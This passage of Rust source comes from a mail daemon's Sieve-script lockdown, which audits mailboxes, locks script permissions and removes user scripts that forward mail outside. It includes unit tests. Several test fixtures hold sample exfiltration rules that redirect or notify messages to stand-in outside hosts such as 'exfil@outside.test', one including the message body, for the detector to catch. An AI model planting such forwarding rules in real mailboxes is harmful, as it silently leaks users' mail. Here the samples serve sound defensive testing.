        // keys, is listed even with no scripts.
        let mut keys_flag = is_k2 && !api_key_locked;
        match keys.api_key_ids(id) {
            Ok(k) => {
                entry["apiKeys"] = serde_json::json!(k.len());
                if !k.is_empty() {
                    key_holders += 1;
                    key_total += k.len();
                    keys_flag = true;
                }
            }
            Err(e) => {
                errors += 1;
                entry["apiKeys"] = Value::Null;
                entry["apiKeysError"] = serde_json::json!(e);
                keys_flag = true;
            }
        }
        match scan_account(api, id, is_hosted) {
            Ok(scripts) => {
                let listed: Vec<&ScriptView> = scripts.iter().filter(|s| s.owner != Owner::K2).collect();
                user_scripts += listed.iter().filter(|s| s.owner == Owner::User).count();
                unrecognised += listed.iter().filter(|s| s.owner == Owner::K2Unrecognised).count();
                outside += listed.iter().filter(|s| s.targets.iter().any(|t| t.external)).count();
                entry["k2Scripts"] = serde_json::json!(scripts.len() - listed.len());
                entry["scripts"] = Value::Array(listed.iter().map(|s| s.to_json()).collect());
                if listed.is_empty() && (sieve_locked || !is_k2) && !keys_flag {
                    continue;
                }
            }
            Err(e) => {
                errors += 1;
                entry["error"] = serde_json::json!(e);
            }
        }
        accounts.push(entry);
    }
    let enotify = match enotify_off_state(api) {
        Ok(off) => serde_json::json!({ "disabled": off }),
        Err(e) => serde_json::json!({ "disabled": null, "error": e }),
    };
    Ok(serde_json::json!({
        "ok": true,
        "installed": true,
        "readOnly": true,
        "summary": {
            "accountsScanned": scanned,
            "accountsSkipped": skipped,
            "k2Mailboxes": k2_count,
            "lockedMailboxes": locked,
            "unlockedMailboxes": unlocked,
            "userScripts": user_scripts,
            "unrecognisedK2Scripts": unrecognised,
            "scriptsWithOutsideTargets": outside,
            "apiKeyLockedMailboxes": key_locked,
            "apiKeyUnlockedMailboxes": key_unlocked,
            "accountsWithApiKeys": key_holders,
            "apiKeys": key_total,
            "errors": errors,
        },
        "enotify": enotify,
        "accounts": accounts,
    }))
}

// ── DB + local state ────────────────────────────────────────────────────

/// `(stalwart account id, address)` for every mailbox K2 minted (active
/// and retired; the active address first). A read error is an error.
pub fn k2_accounts() -> Result<Vec<(String, String)>, String> {
    let db = k2_core::db::shared();
    let conn = db.lock();
    let mut stmt = conn
        .prepare(
            "SELECT stalwart_account_id, address FROM mail_addresses \
             WHERE stalwart_account_id IS NOT NULL AND TRIM(stalwart_account_id) != '' \
             ORDER BY stalwart_account_id, status = 'active' DESC, created_at DESC",
        )
        .map_err(|e| format!("list hosted accounts: {e}"))?;
    let rows = stmt
        .query_map([], |r| Ok((r.get::<_, String>(0)?, r.get::<_, String>(1)?)))
        .map_err(|e| format!("list hosted accounts: {e}"))?;
    let mut out: Vec<(String, String)> = Vec::new();
    for row in rows {
        let (id, addr) = row.map_err(|e| format!("list hosted accounts: {e}"))?;
        if out.last().is_none_or(|(last, _)| *last != id) {
            out.push((id, addr));
        }
    }
    Ok(out)
}

/// Every domain hosted on this box (lowercase).
pub fn hosted_domains() -> Result<HashSet<String>, String> {
    let db = k2_core::db::shared();
    let conn = db.lock();
    let mut stmt = conn
        .prepare("SELECT domain FROM mail_domains")
        .map_err(|e| format!("list hosted domains: {e}"))?;
    let rows = stmt
        .query_map([], |r| r.get::<_, String>(0))
        .map_err(|e| format!("list hosted domains: {e}"))?;
    rows.map(|r| r.map(|d| d.trim().trim_end_matches('.').to_ascii_lowercase()))
        .collect::<Result<HashSet<_>, _>>()
        .map_err(|e| format!("list hosted domains: {e}"))
}

/// `~/.k2/mail-sieve-flagged.json`: the flag keys already recorded, so a
/// kept unrecognised script is reported once, not at every start.
fn flagged_path() -> std::path::PathBuf {
    dirs::home_dir()
        .unwrap_or_else(|| std::path::PathBuf::from("."))
        .join(".k2")
        .join("mail-sieve-flagged.json")
}

fn load_flagged() -> HashSet<String> {
    std::fs::read_to_string(flagged_path())
        .ok()
        .and_then(|s| serde_json::from_str::<Vec<String>>(&s).ok())
        .map(|v| v.into_iter().collect())
        .unwrap_or_default()
}

fn save_flagged(set: &HashSet<String>) -> Result<(), String> {
    let mut v: Vec<&String> = set.iter().collect();
    v.sort();
    let path = flagged_path();
    if let Some(dir) = path.parent() {
        std::fs::create_dir_all(dir).map_err(|e| format!("mkdir {}: {e}", dir.display()))?;
    }
    std::fs::write(&path, serde_json::to_string(&v).map_err(|e| e.to_string())?)
        .map_err(|e| format!("write {}: {e}", path.display()))
}

// ── Route ───────────────────────────────────────────────────────────────

/// `GET /cli/mail/sieve-audit` — read-only. Owner/admin
/// (`mail_routes::is_owner_level_mutation`).
pub fn handle_audit_get(_params: &HashMap<String, String>) -> CliResponse {
    let installed = {
        let db = k2_core::db::shared();
        let conn = db.lock();
        crate::mail::domains::server_info(&conn).is_some()
    };
    if !installed {
        return CliResponse::ok_json(
            serde_json::json!({ "ok": true, "installed": false, "readOnly": true }).to_string(),
        );
    }
    let client = match crate::mail::domains::engine_from_db() {
        Ok((c, _)) => c,
        Err(e) => return crate::mail::hosted::err_json("503 Service Unavailable", "not_ready", e),
    };
    let minted: HashMap<String, String> = match k2_accounts() {
        Ok(v) => v.into_iter().collect(),
        Err(e) => return crate::mail::hosted::err_json("500 Internal Server Error", "error", e),
    };
    let hosted = match hosted_domains() {
        Ok(h) => h,
        Err(e) => return crate::mail::hosted::err_json("500 Internal Server Error", "error", e),
    };
    let is_hosted = |d: &str| hosted.contains(d);
    match audit(&client, &client, &minted, &is_hosted) {
        Ok(v) => CliResponse::ok_json(v.to_string()),
        Err(e) => crate::mail::hosted::err_json("502 Bad Gateway", "engine", e),
    }
}

// ── Boot / enable / upgrade reconcile (the defaults.rs pattern) ────────

/// Boot hook (daemon_main, next to the DAV backfill). Linux only; one
/// detached thread; panics contained; never blocks boot.
pub fn spawn_startup_reconcile() {
    spawn("boot");
}

/// After a completed `hostmail enable` or a successful `hostmail upgrade`.
pub fn spawn_after(reason: &'static str) {
    spawn(reason);
}

fn spawn(reason: &'static str) {
    if !super::supervisor::mail_supported() || cfg!(test) {
        return;
    }
    let spawned = std::thread::Builder::new()
        .name("mail-sieve-lockdown".into())
        .spawn(move || {
            if std::panic::catch_unwind(|| run_live(reason)).is_err() {
                k2_core::log_debug!("{P} FAILED (daemon carries on): panicked ({reason})");
            }
        });
    if let Err(e) = spawned {
        k2_core::log_debug!("{P} FAILED (daemon carries on): thread spawn: {e}");
    }
}

const API_WAIT_STEP_SECS: u64 = 3;
/// ~10 min: covers the IMAP reconcile's Stalwart restart.
const API_WAIT_TRIES: u32 = 200;

struct EndEnable;
impl Drop for EndEnable {
    fn drop(&mut self) {
        super::supervisor::end_enable();
    }
}

fn wait_and_lock(client: &StalwartClient, reason: &str) -> Option<EndEnable> {
    use std::sync::atomic::Ordering;
    let mut up = false;
    let mut last_err = String::from("enable lock held");
    for _ in 0..API_WAIT_TRIES {
        if !super::supervisor::enable_running().load(Ordering::SeqCst) {
            if !up {
                match client.ping() {
                    Ok(()) => up = true,
                    Err(e) => last_err = e,
                }
            }
            if up && super::supervisor::try_begin_enable() {
                return Some(EndEnable);
            }
        }
        std::thread::sleep(std::time::Duration::from_secs(API_WAIT_STEP_SECS));
    }
    k2_core::log_debug!("{P} skipped ({reason}; retried at the next start): {last_err}");
    None
}

#[cfg_attr(test, allow(dead_code))]
fn run_live(reason: &'static str) {
    use super::supervisor;
    let status = supervisor::current_status();
    if let Some(why) = super::defaults::gate(status.as_deref(), supervisor::enable_completed()) {
        k2_core::log_debug!("{P} skipped ({reason}) because {why}");
        return;
    }
    let client = match supervisor::mgmt_client_from_row() {
        Ok(c) => c,
        Err(e) => {
            k2_core::log_debug!("{P} skipped ({reason}) because no management client: {e}");
            return;
        }
    };
    let Some(_guard) = wait_and_lock(&client, reason) else {
        return;
    };
    let accounts: Vec<(String, Option<String>)> = match k2_accounts() {
        Ok(v) => v.into_iter().map(|(id, a)| (id, Some(a))).collect(),
        Err(e) => {
            k2_core::log_debug!("{P} FAILED ({reason}; retried at the next start): {e}");
            return;
        }
    };
    let hosted = match hosted_domains() {
        Ok(h) => h,
        Err(e) => {
            k2_core::log_debug!("{P} FAILED ({reason}; retried at the next start): {e}");
            return;
        }
    };
    let is_hosted = |d: &str| hosted.contains(d);
    let mut flagged = load_flagged();
    let mut record = |f: &Finding| record_live(f);
    let report = reconcile(&client, &accounts, &is_hosted, &flagged, &mut record);
    for line in report.lines() {
        k2_core::log_debug!("{line} ({reason})");
    }
    let new_flags: Vec<String> = report
        .findings
        .iter()
        .filter(|f| !f.is_removal())
        .map(Finding::flag_key)
        .collect();
    if !new_flags.is_empty() {
        flagged.extend(new_flags);
        if let Err(e) = save_flagged(&flagged) {
            k2_core::log_debug!("{P} WARN could not save the flagged-script list (re-reported next start): {e}");
        }
    }
    if let Some((title, body)) = notice_text(&report) {
        if let Err(e) = crate::feedback_routes::file_owner_notice(
            k2_core::db::AUDIT_SENTINEL_IDS[0],
            "k2-mail",
            &title,
            &body,
        ) {
            k2_core::log_debug!("{P} owner notice FAILED: {e}");
        }
    }
    // 0.46.6: same pass, same engine lock — take `sysApiKeyCreate` off
    // every K2 mailbox (one audit line per mailbox changed).
    super::api_key_lockdown::run_with(&client, &accounts, reason);
}

/// Record one script before anything removes it: the auth-audit log,
/// and the daemon log always (so a full disk never hides it).
fn record_live(f: &Finding) {
    let at = chrono::Utc::now().to_rfc3339_opts(chrono::SecondsFormat::Secs, true);
    let detail = f.audit_detail(&at);
    k2_core::log_debug!("{P} {}: {detail}", f.audit_event());
    let who = f.address.clone().unwrap_or_else(|| f.account_id.clone());
    let outcome = if f.is_removal() { "removing" } else { "kept" };
    let ev = k2_core::auth_audit::AuditEvent::new(f.audit_event(), &who, outcome, "daemon", "-", "daemon");
    if let Err(e) = k2_core::auth_audit::try_record_detail(&ev, detail) {
        k2_core::log_debug!("{P} WARN auth-audit write failed (the line above is the record): {e}");
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::cell::RefCell;

    fn hosted(d: &str) -> bool {
        d == "example.test" || d == "brand.test"
    }

    // ── permissions ──

    #[test]
    fn mint_permissions_lock_sieve_on_top_of_the_dav_policy() {
        let none = mint_permissions(None).expect("lock");
        assert_eq!(none["@type"], "Merge");
        for p in SIEVE_WRITE_PERMISSIONS {
            assert_eq!(none["disabledPermissions"][p], true, "{none}");
        }
        assert!(is_locked(Some(&none)));
        let dav = serde_json::json!({
            "@type": "Merge",
            "enabledPermissions": {},
            "disabledPermissions": { "davFileGet": true },
        });
        let both = mint_permissions(Some(dav)).expect("lock");
        assert_eq!(both["disabledPermissions"]["davFileGet"], true, "DAV kept: {both}");
        assert_eq!(both["disabledPermissions"]["jmapSieveScriptCreate"], true);
        assert!(is_locked(Some(&both)));
        // Already locked → unchanged.
        assert_eq!(mint_permissions(Some(both.clone())).expect("same"), both);
        assert!(!is_locked(None));
        assert!(!is_locked(Some(&serde_json::json!({"@type": "Inherit"}))));
        // An account locked before the ManageSieve names (JMAP three only)
        // is not locked: the reconcile adds the rest and keeps the three.
        let jmap_only = serde_json::json!({
            "@type": "Merge",
            "enabledPermissions": {},
            "disabledPermissions": {
                "jmapSieveScriptCreate": true, "jmapSieveScriptUpdate": true, "jmapSieveScriptDestroy": true,
            },
        });
        assert!(!is_locked(Some(&jmap_only)));
        let up = lock_permissions(Some(&jmap_only)).expect("merge").expect("changed");
        for p in ["jmapSieveScriptCreate", "sievePutScript", "sieveSetActive", "sieveDeleteScript", "sieveRenameScript"] {
            assert_eq!(up["disabledPermissions"][p], true, "{p}: {up}");
        }
        assert!(is_locked(Some(&up)));
        // An operator's Replace list: the Sieve writes leave `enabled`.
        let rep = serde_json::json!({
            "@type": "Replace",
            "enabledPermissions": { "jmapSieveScriptCreate": true, "emailSend": true },
            "disabledPermissions": {},
        });
        let r = lock_permissions(Some(&rep)).expect("merge").expect("changed");
        assert_eq!(r["@type"], "Replace");
        assert!(r["enabledPermissions"].get("jmapSieveScriptCreate").is_none(), "{r}");
        assert_eq!(r["enabledPermissions"]["emailSend"], true);
    }

    #[test]
    fn lock_survives_a_dav_policy_flip() {
        let locked = mint_permissions(None).expect("lock");
        for (cal, files) in [
            (crate::mail::dav::OnOff::On, crate::mail::dav::OnOff::On),
            (crate::mail::dav::OnOff::Off, crate::mail::dav::OnOff::Off),
        ] {
            let p = crate::mail::dav::DavPolicy { calendars: cal, files, applied_at: 1, backfilled_at: None };
            // The DAV backfill must never drop the Sieve lock (nor collapse
            // the account to Inherit).
            let after = merge_permissions(Some(&locked), &p.denied(), &p.allowed())
                .expect("merge")
                .unwrap_or(locked.clone());
            assert!(is_locked(Some(&after)), "{after}");
        }
    }

    // ── classify ──

    fn k2_ooo() -> sieve_user::OooBlock {
        sieve_user::OooBlock {
            days: 7,
            text: "Away — I'll redirect your note on Monday.".to_string(),
            until: Some("2026-12-31".to_string()),
            from: "alice@example.test".to_string(),
        }
    }

    #[test]
    fn k2_composed_scripts_are_k2_and_kept() {
        for (ooo, fwd) in [
            (Some(k2_ooo()), None),
            (None, Some(("bob@example.test", false))),
            (None, Some(("bob@example.test", true))),
            (Some(k2_ooo()), Some(("bob@brand.test", true))),
        ] {
            let s = sieve_user::UserSieve {
                ooo: ooo.clone(),
                forward: fwd.map(|(d, k)| sieve_user::ForwardBlock { dest: d.to_string(), keep: k, guard: None }),
            };
            let src = sieve_user::compose(&s).expect("script");
            let (owner, targets) = classify("k2", &src, &hosted);
            assert_eq!(owner, Owner::K2, "{src}");
            assert!(targets.iter().all(|t| t.action == "redirect" && !t.external), "{targets:?}");
            assert!(plan_cleanup(&[view("1", "k2", true, owner)]).is_empty());
        }
        // save_user_sieve's empty remainder, and the legacy k2-forward form.
        assert_eq!(classify("k2", "keep;\n", &hosted).0, Owner::K2);
        assert_eq!(
            classify("k2-forward", "require [\"copy\"];\nredirect :copy \"bob@example.test\";\n", &hosted).0,
            Owner::K2
        );
        assert_eq!(classify("k2-forward", "redirect \"bob@example.test\";\n", &hosted).0, Owner::K2);
    }

    /// An outside forward K2 composed (guard + redirect) is K2's: the
    /// lockdown keeps it, and reports its one outside target.
    #[test]
    fn k2_outside_forward_is_k2_and_kept() {
        for ooo in [None, Some(k2_ooo())] {
            for keep in [true, false] {
                let s = sieve_user::UserSieve {
                    ooo: ooo.clone(),
                    forward: Some(sieve_user::ForwardBlock {
                        dest: "me@outside.test".to_string(),
                        keep,
                        guard: Some(sieve_user::ForwardGuard { host: "mail.example.test".to_string() }),
                    }),
                };
                let src = sieve_user::compose(&s).expect("script");
                let (owner, targets) = classify("k2", &src, &hosted);
                assert_eq!(owner, Owner::K2, "{src}");
                assert_eq!(targets.len(), 1, "{targets:?}");
                assert!(targets[0].action == "redirect" && targets[0].external, "{targets:?}");
                assert!(plan_cleanup(&[view("1", "k2", true, owner)]).is_empty());
            }
        }
    }

    #[test]
    fn allowlist_is_exactly_k2_and_k2_forward_by_name() {
        // K2-named, other content: kept (by name), flagged.
        let s = "keep;\nnotify \"mailto:x@outside.test?body=${bodytext}\";\n";
        assert_eq!(classify("k2", s, &hosted).0, Owner::K2Unrecognised);
        assert_eq!(classify("k2-forward", "redirect \"x@outside.test\";\nkeep;", &hosted).0, Owner::K2Unrecognised);
        assert!(!Owner::K2Unrecognised.removed());
        // Everything else is a user script, whatever it does — including
        // Stalwart's `vacation` and near-miss names.
        for name in ["vacation", "K2", "k2 ", "k2-forward2", "k2-ooo", "mine", ""] {
            assert_eq!(classify(name, "keep;\n", &hosted).0, Owner::User, "{name:?}");
        }
    }

    #[test]
    fn user_scripts_and_targets_are_domain_only() {
        let (o, t) = classify("mine", "redirect \"exfil@Outside.TEST\";", &hosted);
        assert_eq!(o, Owner::User);
        assert_eq!(t, vec![Target { action: "redirect", domain: "outside.test".into(), external: true }]);
        let (o, t) = classify(
            "x",
            "require [\"copy\"];\r\nif true { redirect :copy \"exfil2@outside.test\"; }",
            &hosted,
        );
        assert_eq!(o, Owner::User);
        assert_eq!(t[0].domain, "outside.test");
        // enotify with a variable in the method: dynamic, reported as such.
        let (_, t) = classify(
            "n",
            "require [\"enotify\",\"variables\"];\nnotify :importance \"1\" :message \"hi\" \
             \"mailto:a%40outside.test?body=${bodytext}\";",
            &hosted,
        );
        let d: Vec<&str> = t.iter().map(|x| x.domain.as_str()).collect();
        assert_eq!(d, vec!["(variable)"], "{t:?}");
        // Tagged args first, method last; ?to= adds recipients.
        let (_, t) = classify(
            "n",
            "notify :from \"me@example.test\" \"mailto:a%40outside.test,b@other.test?to=c@third.test\";",
            &hosted,
        );
        let d: Vec<&str> = t.iter().map(|x| x.domain.as_str()).collect();
        assert_eq!(d, vec!["outside.test", "other.test", "third.test"], "{t:?}");
        assert!(t.iter().all(|x| x.action == "notify" && x.external));
        // Non-mailto notify method.
        let (_, t) = classify("n", "notify \"xmpp:someone@chat.test\";", &hosted);
        assert_eq!(t[0].domain, "(xmpp notify)");
        // Internal redirect: not external.
        let (_, t) = classify("n", "redirect \"carol@example.test\";", &hosted);
        assert!(!t[0].external);
        // Benign filter: still a user script (removed), no targets.
        let (o, t) = classify("f", "require \"fileinto\"; fileinto \"Lists\";", &hosted);
        assert_eq!(o, Owner::User);
        assert!(t.is_empty());
    }

    #[test]
    fn redirect_word_inside_strings_comments_and_text_is_not_an_action() {
        let src = "# redirect \"a@outside.test\";\n/* notify \"mailto:b@outside.test\"; */\n\
                   require \"vacation\";\nvacation :subject \"redirect x@outside.test\" text:\n\
                   redirect \"c@outside.test\";\n..\n.\n;\n";
        let (_, t) = classify("away", src, &hosted);
        assert!(t.is_empty(), "{t:?}");
        // An argument word is not a command.
        let (_, t) = classify("x", "if header :contains \"subject\" \"redirect\" { keep; }", &hosted);
        assert!(t.is_empty(), "{t:?}");
    }

    // ── plan ordering ──

    fn view(id: &str, name: &str, active: bool, owner: Owner) -> ScriptView {
        ScriptView {
            id: id.into(),
            name: name.into(),
            blob_id: format!("B{id}"),
            active,
            owner,
            targets: vec![],
        }
    }

    #[test]
    fn plan_deactivates_before_destroy_and_puts_k2_back() {
        let s = vec![
            view("k", "k2", false, Owner::K2),
            view("u", "mine", true, Owner::User),
            view("v", "other", false, Owner::User),
        ];
        assert_eq!(
            plan_cleanup(&s),
            vec![
                Step::Deactivate,
                Step::Destroy(vec!["u".into(), "v".into()]),
                Step::Activate("k".into())
            ]
        );
        // Prefer `k2` over the legacy `k2-forward`.
        let s = vec![
            view("f", "k2-forward", false, Owner::K2),
            view("k", "k2", false, Owner::K2),
            view("u", "mine", true, Owner::User),
        ];
        assert_eq!(plan_cleanup(&s).last(), Some(&Step::Activate("k".into())));
        // Inactive user script while K2's is active: no deactivate (that
        // would switch K2's forward off), no re-activate.
        let s = vec![view("k", "k2", true, Owner::K2), view("u", "mine", false, Owner::User)];
        assert_eq!(plan_cleanup(&s), vec![Step::Destroy(vec!["u".into()])]);
        // An unrecognised K2-named script is never destroyed and never
        // re-activated.
        let s = vec![view("k", "k2", false, Owner::K2Unrecognised), view("u", "mine", true, Owner::User)];
        assert_eq!(plan_cleanup(&s), vec![Step::Deactivate, Step::Destroy(vec!["u".into()])]);
        let s = vec![view("k", "k2", true, Owner::K2Unrecognised)];
        assert!(plan_cleanup(&s).is_empty());
    }

    // ── reconcile against a recording fake ──

    #[derive(Default)]
    struct Fake {
        log: RefCell<Vec<String>>,
        rows: Vec<Value>,
        scripts: HashMap<String, Vec<(SieveScriptInfo, String)>>,
        caps: RefCell<Value>,
        fail_destroy: bool,
        reload_fails: bool,
        /// API keys per account (0.46.6 audit).
        api_keys: HashMap<String, usize>,
    }

    impl Fake {
        fn push(&self, s: String) {
            self.log.borrow_mut().push(s);
        }
    }

    impl ApiKeyLockApi for Fake {
        fn key_account_rows(&self, ids: &[String]) -> Result<Vec<Value>, String> {
            SieveLockApi::account_rows(self, ids)
        }
        fn key_set_permissions(&self, id: &str, _p: &Value) -> Result<(), String> {
            self.push(format!("keyperm:{id}"));
            Ok(())
        }
        fn api_key_ids(&self, a: &str) -> Result<Vec<String>, String> {
            self.push(format!("keys:{a}"));
            let n = self.api_keys.get(a).copied().unwrap_or(0);
            Ok((0..n).map(|i| format!("{a}-key{i}")).collect())
        }
    }

    impl SieveLockApi for Fake {
        fn all_account_ids(&self) -> Result<Vec<String>, String> {
            Ok(self.rows.iter().filter_map(|r| r["id"].as_str().map(str::to_string)).collect())
        }
        fn account_rows(&self, ids: &[String]) -> Result<Vec<Value>, String> {
            Ok(self
                .rows
                .iter()
                .filter(|r| ids.iter().any(|i| r["id"] == i.as_str()))
                .cloned()
                .collect())
        }
        fn set_permissions(&self, id: &str, p: &Value) -> Result<(), String> {
            self.push(format!("perm:{id}:{}", is_locked(Some(p))));
            Ok(())
        }
        fn list_scripts(&self, a: &str) -> Result<Vec<SieveScriptInfo>, String> {
            self.push(format!("list:{a}"));
            Ok(self.scripts.get(a).map(|v| v.iter().map(|(i, _)| i.clone()).collect()).unwrap_or_default())
        }
        fn script_source(&self, a: &str, blob: &str) -> Result<Vec<u8>, String> {
            let src = self.scripts[a].iter().find(|(i, _)| i.blob_id == blob).expect("blob").1.clone();
            Ok(src.into_bytes())
        }
        fn deactivate(&self, a: &str) -> Result<(), String> {
            self.push(format!("deactivate:{a}"));
            Ok(())
        }
        fn destroy(&self, a: &str, ids: &[String]) -> Result<(), String> {
            self.push(format!("destroy:{a}:{}", ids.join(",")));
            if self.fail_destroy {
                return Err("notDestroyed: scriptIsActive".into());
            }
            Ok(())
        }
        fn activate(&self, a: &str, id: &str) -> Result<(), String> {
            self.push(format!("activate:{a}:{id}"));
            Ok(())
        }
        fn interpreter_disabled(&self) -> Result<Value, String> {
            Ok(self.caps.borrow().clone())
        }
        fn set_interpreter_disabled(&self, d: &Value) -> Result<(), String> {
            self.push(format!("caps:{d}"));
            *self.caps.borrow_mut() = d.clone();
            Ok(())
        }
        fn reload_settings(&self) -> Result<(), String> {
            self.push("reload".into());
            if self.reload_fails {
                return Err("refused".into());
            }
            Ok(())
        }
    }

    fn user_row(id: &str, perms: Value) -> Value {
        serde_json::json!({ "id": id, "@type": "User", "name": id, "permissions": perms })
    }

    fn info(id: &str, name: &str, active: bool) -> SieveScriptInfo {
        SieveScriptInfo { id: id.into(), name: name.into(), blob_id: format!("B{id}"), is_active: active }
    }

    fn k2_forward_src() -> String {
        sieve_user::compose(&sieve_user::UserSieve {
            ooo: None,
            forward: Some(sieve_user::ForwardBlock { dest: "carol@example.test".into(), keep: true, guard: None }),
        })
        .expect("script")
    }

    #[test]
    fn reconcile_records_then_deactivates_then_destroys_then_restores_k2() {
        let mut fake = Fake {
            rows: vec![
                user_row("a", Value::Null),
                user_row("b", mint_permissions(None).unwrap()),
                serde_json::json!({ "id": "svc", "@type": "User", "name": "k2-daemon",
                    "roles": {"@type": "Admin"} }),
            ],
            caps: RefCell::new(serde_json::json!({ "vnd.stalwart.expressions": true })),
            ..Fake::default()
        };
        fake.scripts.insert(
            "a".into(),
            vec![
                (info("k", "k2", false), k2_forward_src()),
                (info("u", "mine", true), "require [\"copy\"];\nredirect :copy \"exfil@outside.test\";".into()),
            ],
        );
        fake.scripts.insert("b".into(), vec![(info("k", "k2", true), k2_forward_src())]);
        let accounts = vec![
            ("a".to_string(), Some("alice@example.test".to_string())),
            ("b".to_string(), Some("bob@example.test".to_string())),
            ("svc".to_string(), None),
        ];
        let rec_log = RefCell::new(Vec::<Finding>::new());
        let mut record = |f: &Finding| {
            fake.push(format!("record:{}:{}", f.account_id, f.script.name));
            rec_log.borrow_mut().push(f.clone());
        };
        let report = reconcile(&fake, &accounts, &hosted, &HashSet::new(), &mut record);
        let log = fake.log.borrow().clone();
        assert_eq!(
            log,
            vec![
                // enotify off, the operator's other entry kept, one reload;
                // nothing else in the interpreter (never maxRedirects).
                r#"caps:{"enotify":true,"vnd.stalwart.expressions":true}"#.to_string(),
                "reload".into(),
                // a: lock first, then scan, record, deactivate, destroy, restore k2.
                "perm:a:true".into(),
                "list:a".into(),
                "record:a:mine".into(),
                "deactivate:a".into(),
                "destroy:a:u".into(),
                "activate:a:k".into(),
                // b: already locked, only K2's script → nothing written.
                "list:b".into(),
            ],
        );
        assert!(!log.iter().any(|l| l.contains("maxRedirects")));
        assert_eq!(report.caps, Some(CapsOutcome::TurnedOff));
        assert_eq!(report.locked, vec!["a".to_string()]);
        assert_eq!(report.already_locked, 1);
        assert_eq!(report.skipped.len(), 1, "service account never touched");
        assert_eq!(report.findings.len(), 1);
        let r = &report.findings[0];
        assert!(r.removed);
        assert_eq!(r.address.as_deref(), Some("alice@example.test"));
        assert_eq!(r.script.targets[0].domain, "outside.test");
        // The record was made before removal (removed=false at that time).
        assert!(!rec_log.borrow()[0].removed);
        let detail = r.audit_detail("2026-10-27T00:00:00Z");
        assert_eq!(detail["script"], "mine");
        assert_eq!(detail["action"], "remove");
        assert_eq!(detail["targets"][0]["domain"], "outside.test");
        assert!(!detail.to_string().contains("exfil@"), "domain only: {detail}");
        let (title, body) = notice_text(&report).expect("notice");
        assert!(title.contains("removed 1"), "{title}");
        assert!(body.contains("alice@example.test") && body.contains("outside.test (outside)"), "{body}");
        assert!(!body.contains("exfil@"), "{body}");

        // Second pass: everything already done → no writes, no notice.
        fake.log.borrow_mut().clear();
        fake.rows[0] = user_row("a", mint_permissions(None).unwrap());
        fake.scripts.insert("a".into(), vec![(info("k", "k2", true), k2_forward_src())]);
        let mut none = |_: &Finding| panic!("nothing to record");
        let again = reconcile(&fake, &accounts, &hosted, &HashSet::new(), &mut none);
        assert_eq!(*fake.log.borrow(), vec!["list:a".to_string(), "list:b".to_string()]);
        assert_eq!(again.caps, Some(CapsOutcome::AlreadyOff));
        assert!(notice_text(&again).is_none());
    }

    #[test]
    fn unrecognised_k2_script_is_kept_recorded_once_and_noticed() {
        let mut fake = Fake { rows: vec![user_row("a", mint_permissions(None).unwrap())], ..Fake::default() };
        *fake.caps.borrow_mut() = serde_json::json!({ "enotify": true });
        fake.scripts.insert(
            "a".into(),
            vec![(info("k", "k2", true), "require [\"copy\"];\nredirect :copy \"x@outside.test\";\nkeep;\n".into())],
        );
        let mut seen = Vec::new();
        let mut record = |f: &Finding| seen.push(f.clone());
        let report = reconcile(&fake, &[("a".into(), Some("alice@example.test".into()))], &hosted, &HashSet::new(), &mut record);
        assert_eq!(*fake.log.borrow(), vec!["list:a".to_string()], "kept: no deactivate/destroy");
        assert_eq!(seen.len(), 1);
        assert_eq!(seen[0].audit_event(), AUDIT_EVENT_UNRECOGNISED);
        assert_eq!(seen[0].audit_detail("t")["action"], "keep");
        let (title, body) = notice_text(&report).expect("notice");
        assert!(title.contains("1 to check"), "{title}");
        assert!(body.contains("kept") && body.contains("outside.test"), "{body}");
        // Already flagged → not recorded again, no notice.
        let before: HashSet<String> = [seen[0].flag_key()].into_iter().collect();
        let mut none = |_: &Finding| panic!("already flagged");
        let again = reconcile(&fake, &[("a".into(), None)], &hosted, &before, &mut none);
        assert!(notice_text(&again).is_none());
    }

    #[test]
    fn reconcile_failure_is_reported_and_not_marked_removed() {
        let mut fake = Fake {
            rows: vec![user_row("a", Value::Null)],
            fail_destroy: true,
            reload_fails: true,
            ..Fake::default()
        };
        fake.scripts.insert("a".into(), vec![(info("u", "mine", false), "redirect \"x@outside.test\";".into())]);
        let mut n = 0;
        let mut record = |_: &Finding| n += 1;
        let report = reconcile(&fake, &[("a".into(), None)], &hosted, &HashSet::new(), &mut record);
        assert_eq!(n, 1, "recorded even though removal then failed");
        assert!(matches!(report.caps, Some(CapsOutcome::SavedNotLoaded(_))));
        assert_eq!(report.account_failed.len(), 1);
        assert!(!report.findings[0].removed);
        let (_, body) = notice_text(&report).expect("notice");
        assert!(body.contains("NOT removed yet"), "{body}");
        assert!(report.lines().iter().any(|l| l.contains("cleanup FAILED")));
    }

    #[test]
    fn audit_is_read_only_and_lists_non_k2_scripts() {
        let full_lock = api_key_lockdown::mint_permissions(mint_permissions(None).unwrap()).unwrap();
        let mut fake = Fake {
            rows: vec![
                user_row("a", Value::Null),
                user_row("b", full_lock.clone()),
                user_row("c", full_lock),
                user_row("d", mint_permissions(None).unwrap()),
                user_row("ext", Value::Null),
            ],
            caps: RefCell::new(Value::Null),
            api_keys: [("c".to_string(), 1), ("ext".to_string(), 2)].into_iter().collect(),
            ..Fake::default()
        };
        fake.scripts.insert(
            "a".into(),
            vec![
                (info("k", "k2", false), k2_forward_src()),
                (info("u", "mine", true), "redirect :copy \"exfil@outside.test\";".into()),
            ],
        );
        fake.scripts.insert("b".into(), vec![(info("k", "k2", true), k2_forward_src())]);
        fake.scripts.insert("ext".into(), vec![(info("f", "filters", true), "fileinto \"X\";".into())]);
        let minted: HashMap<String, String> = [
            ("a".to_string(), "alice@example.test".to_string()),
            ("b".to_string(), "bob@example.test".to_string()),
            ("c".to_string(), "carol@example.test".to_string()),
            ("d".to_string(), "dave@example.test".to_string()),
        ]
        .into_iter()
        .collect();
        let v = audit(&fake, &fake, &minted, &hosted).expect("audit");
        for entry in fake.log.borrow().iter() {
            assert!(
                entry.starts_with("list:") || entry.starts_with("keys:"),
                "audit wrote something: {entry}"
            );
        }
        assert_eq!(v["readOnly"], true);
        assert_eq!(v["enotify"]["disabled"], false);
        assert_eq!(v["summary"]["k2Mailboxes"], 4);
        assert_eq!(v["summary"]["lockedMailboxes"], 3);
        assert_eq!(v["summary"]["unlockedMailboxes"], 1);
        assert_eq!(v["summary"]["userScripts"], 2);
        assert_eq!(v["summary"]["scriptsWithOutsideTargets"], 1);
        // 0.46.6: API keys.
        assert_eq!(v["summary"]["apiKeyLockedMailboxes"], 2);
        assert_eq!(v["summary"]["apiKeyUnlockedMailboxes"], 2, "a and d");
        assert_eq!(v["summary"]["accountsWithApiKeys"], 2, "c and ext");
        assert_eq!(v["summary"]["apiKeys"], 3);
        assert_eq!(v["summary"]["errors"], 0);
